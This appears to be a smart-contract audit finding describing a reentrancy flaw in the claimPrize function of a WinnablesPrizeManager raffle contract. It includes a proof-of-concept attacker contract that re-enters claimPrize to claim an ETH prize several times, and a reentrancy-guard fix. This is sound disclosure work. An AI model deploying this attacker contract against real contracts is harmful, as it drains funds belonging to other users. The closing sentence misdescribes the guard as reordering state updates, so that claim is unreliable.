# Reentrancy in claimPrize Function

## Summary

The `claimPrize` function in the WinnablesPrizeManager contract is vulnerable to reentrancy due to its failure to adhere to the Checks-Effects-Interactions (CEI) pattern, or implement a reentrancy guard. This vulnerability could potentially allow a malicious contract that has won a raffle to claim a prize multiple times.

## Vulnerability Detail

The `claimPrize` function performs external calls (sending ETH, tokens, or NFTs) before updating the raffle status to "CLAIMED". This order of operations, with no reentrancy guard, creates a window for reentrancy attacks. Here's the relevant code snippet:

```solidity
function claimPrize(uint256 raffleId) external {
    // ... (checks)

    if (raffleType == RaffleType.NFT) {
        // ... (NFT transfer logic)
    } else if (raffleType == RaffleType.TOKEN) {
        // ... (token transfer logic)
    } else if (raffleType == RaffleType.ETH) {
        unchecked { _ethLocked -= _ethRaffles[raffleId]; }
        _sendETHPrize(_ethRaffles[raffleId], msg.sender);
    } else revert InvalidRaffle();

    // State update occurs after external calls
    rafflePrize.status = RafflePrizeStatus.CLAIMED;
    emit PrizeClaimed(raffleId, msg.sender);
}
```

The issue lies in the fact that the raffle status is updated after the prize is sent. If the winner is a malicious contract, it could potentially re-enter the `claimPrize` function during the prize transfer, allowing multiple claims before the status is updated.

## Impact

This vulnerability could allow a malicious raffle winner, that is a contract, to claim the same prize multiple times, draining the contract of more funds than intended.


## Proof of Concept

```solidity
contract MaliciousWinner {
    WinnablesPrizeManager public prizeManager;
    uint256 public raffleId;
    uint256 public claimCount;

    constructor(WinnablesPrizeManager _prizeManager, uint256 _raffleId) {
        prizeManager = _prizeManager;
        raffleId = _raffleId;
    }

    function attack() external {
        prizeManager.claimPrize(raffleId);
    }

    receive() external payable {
        if (claimCount < 3) {
            claimCount++;
            prizeManager.claimPrize(raffleId);
        }
    }
}
```

This malicious contract, when set as the winner of a raffle, could potentially claim the prize multiple times by re-entering the `claimPrize` function during the ETH transfer.

## Tool used

Manual Review

## Recommendation

Add a reentrancy guard to claimPrize (from OpenZeppelin or a custom implementation as seen below)

Reentrancy guard modifier:

```solidity
bool private _locked;

modifier noReentrant() {
    require(!_locked, "No reentrancy");
    _locked = true;
    _;
    _locked = false;
}

function claimPrize(uint256 raffleId) external noReentrant {
    // ... (function body)
}
```

These changes will ensure that the contract state is updated before any external calls are made, preventing reentrancy attacks and maintaining the integrity of the prize claiming process.
